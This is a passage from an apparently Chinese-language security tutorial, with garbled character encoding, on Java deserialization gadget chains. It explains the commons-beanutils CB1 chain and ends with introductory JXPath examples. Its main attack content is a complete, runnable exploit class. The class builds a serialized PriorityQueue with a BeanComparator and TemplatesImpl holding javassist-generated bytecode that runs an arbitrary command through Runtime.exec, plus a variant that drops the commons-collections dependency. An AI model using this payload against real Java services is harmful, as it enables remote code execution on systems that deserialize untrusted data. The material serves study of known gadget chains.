class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨æ‰§è¡Œ <code>PropertyUtils.getProperty(bean, &quot;name&quot;)</code> æ—¶ï¼Œcommons-beanutils ä¼šè‡ªåŠ¨æ‰¾åˆ° <code>name</code> å±æ€§çš„ getter æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ <code>getName</code>ï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œ <code>PropertyUtils.getProperty</code> è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚ <code>a</code> å¯¹è±¡ä¸­æœ‰å±æ€§ <code>b</code>ï¼Œ<code>b</code> å¯¹è±¡ä¸­æœ‰å±æ€§ <code>c</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„ getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®š JavaBean æ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨ã€‚</p>
<p>å½“ç„¶ï¼Œcommons-beanutils ä¸­è¯¸å¦‚æ­¤ç±»çš„è¾…åŠ©æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œå¦‚è°ƒç”¨ setterã€æ‹·è´å±æ€§ç­‰ï¼Œè¿™é‡Œä¸å†ç»†è¯´ã€‚</p>
<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:507)</span><br><span class="line">...</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)</span><br><span class="line">at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:157)</span><br><span class="line">at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">at java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">at java.util.PriorityQueue.readObject(PriorityQueue.java:795)</span><br></pre></td></tr></table></figure></div>

<h3 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>commons-beanutils çš„ <code>org.apache.commons.beanutils.BeanComparator</code> å®ç°äº† <code>java.util</code> æ¥å£ï¼Œå®ƒçš„ <code>compare</code> æ–¹æ³•ä¼šå¯¹å¾…æ¯”è¾ƒå¯¹è±¡è°ƒç”¨ <code>PropertyUtils.getProperty</code> æ–¹æ³•è·å– <code>property</code> å±æ€§ã€‚è€Œ <code>TemplatesImpl#getOutputProperties</code> å¯ä»¥è§¦å‘å­—èŠ‚ç åŠ è½½ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 ); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// âœ… property è®¾ç½®ä¸º &quot;outputProperties&quot;</span></span><br><span class="line">        <span class="comment">// o1, o2 ä¸º PriorityQueue ä¸­çš„ TemplatesImpl</span></span><br><span class="line">        <span class="comment">// åˆ™ PropertyUtils.getProperty( o1, property ) =&gt; TemplatesImpl.getOutputProperties()</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å€Ÿé‰´ CC2 çš„æ€è·¯åœ¨ <code>PriorityQueue</code> ä¸­æ”¾ä¸¤ä¸ª <code>TemplatesImpl</code> å¹¶ä¸”è®¾ç½® <code>comparator</code> ä¸º <code>BeanComparator</code> æ¥è§¦å‘ <code>BeanComparator#compare</code> æ–¹æ³•è°ƒç”¨ã€‚</p>
<p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬è®¾ç½® <code>BeanComparator</code> çš„ <code>property</code> å±æ€§ä¸º <code>outputProperties</code> åˆ™åœ¨ååºåˆ—åŒ–è§¦å‘ <code>BeanComparator#compare</code> æ—¶ä¼šé€šè¿‡ <code>PropertyUtils.getProperty</code> è°ƒç”¨åˆ° <code>TemplatesImpl#getOutputProperties</code> è¿›è€Œå®ç°ä»»æ„å­—èŠ‚ç åŠ è½½ã€‚</p>
<h3 id="åˆ©ç”¨ä»£ç -1"><a href="#åˆ©ç”¨ä»£ç -1" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œéœ€è¦æ³¨æ„ <code>BeanComparator</code> çš„æ„é€ æ–¹æ³•æœ‰ä¸¤ä¸ªï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š <code>Comparator</code> é»˜è®¤ä¼šä½¿ç”¨ <code>org.apache.commons.collections.comparators.ComparableComparator</code>ã€‚è¿™æ ·æ”¹åˆ©ç”¨é“¾ä¼šä¾èµ–äº commons-collections åº“ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºäº†é¿å…è¿™ç§ä¾èµ–å…³ç³»ä»è€Œæé«˜åˆ©ç”¨é“¾çš„é€šç”¨æ€§ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ <code>ComparableComparator</code>ï¼Œå®ƒéœ€è¦æ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>å®ç° <code>java.util.Comparator</code> æ¥å£</li>
<li>å®ç° <code>java.io.Serializable</code> æ¥å£</li>
<li>Javaã€shiro æˆ– commons-beanutils è‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼ºã€‚</li>
</ul>
<p>å®é™…ä¸Šæœ‰å¾ˆå¤šç±»éƒ½æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ <code>CaseInsensitiveComparator</code>ï¼Œå¯ä»¥é€šè¿‡ <code>String.CASE_INSENSITIVE_ORDER</code>  è·å–ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/105e5cae598e4a888081c4dcf0b3919e.png"
                      alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"
                ></p>
<p>æˆ–è€…å¹²è„†ç›´æ¥åå°„å°† <code>comparator</code> è®¾ç½®ä¸º <code>null</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>);</span><br><span class="line">    PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">    setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    setFieldValue(comparator, <span class="string">&quot;comparator&quot;</span>, <span class="literal">null</span>); <span class="comment">// ğŸ‘ˆ å°† comparator ç½®ç©º</span></span><br><span class="line">    setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">    setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Jxpath"><a href="#Jxpath" class="headerlink" title="Jxpath"></a>Jxpath</h1><p>Xpath æ˜¯ä¸€é—¨åœ¨ XML æ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯çš„è¯­è¨€ï¼ŒJXpath æ˜¯ Xpath çš„ Java å®ç°ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-jxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-jxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>JXpath é™¤äº† XPath å‡½æ•°ï¼Œè¿˜æ”¯æŒè”é€š Java çš„æ‰©å±•å‡½æ•°</p>
<ul>
<li>æ„é€ å™¨è°ƒç”¨</li>
<li>é™æ€æ–¹æ³•è°ƒç”¨</li>
<li>æ™®é€šæ–¹æ³•è°ƒç”¨</li>
</ul>
<h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä¾‹å¦‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ª <code>Dog</code> ç±»ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;      <span class="comment">// æ¼”ç¤ºç”¨ï¼šå¯ç›´æ¥è®¿é—®å­—æ®µ</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Constructor Called&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age  = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- é™æ€æ–¹æ³• ----</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sayHello</span><span class="params">(String who)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + who + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- å®ä¾‹æ–¹æ³• ----</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greet</span><span class="params">(String who)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;woof &quot;</span> + who + <span class="string">&quot;, I&#x27;m &quot;</span> + name + <span class="string">&quot; (&quot;</span> + age + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String  <span class="title function_">getName</span><span class="params">()</span>           &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>    <span class="title function_">setName</span><span class="params">(String n)</span>   &#123; <span class="built_in">this</span>.name = n; &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span>            &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>    <span class="title function_">setAge</span><span class="params">(Integer a)</span>   &#123; <span class="built_in">this</span>.age = a; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;dog&#123;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;, age=&quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ Jxpath æˆ‘ä»¬å¯ä»¥åˆ›å»º <code>Dog</code> å®ä¾‹ï¼Œè°ƒç”¨é™æ€å’Œæ™®é€šæ–¹æ³•ï¼Œä»¥åŠè·å–å’Œä¿®æ”¹å±æ€§ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.ClassFunctions;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.Functions;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.JXPathContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JxpathTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// æ ¹ä¸º nullï¼šç”¨æ¥åšæ„é€ å™¨/é™æ€æ–¹æ³•/æ‰©å±•å‡½æ•°è§£æ</span></span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">ctx</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) æ„é€ å™¨è°ƒç”¨</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ctorExpr</span> <span class="operator">=</span> <span class="string">&quot;com.example.Dog.new(&#x27;taco&#x27;, 18)&quot;</span>;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) ctx.getValue(ctorExpr);</span><br><span class="line">        System.out.println(<span class="string">&quot;[ctor]   =&gt; &quot;</span> + dog);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) é™æ€æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">staticExpr</span> <span class="operator">=</span> <span class="string">&quot;com.example.Dog.sayHello(&#x27;world&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> (String) ctx.getValue(staticExpr);</span><br><span class="line">        System.out.println(<span class="string">&quot;[static] =&gt; &quot;</span> + hello);</span><br><span 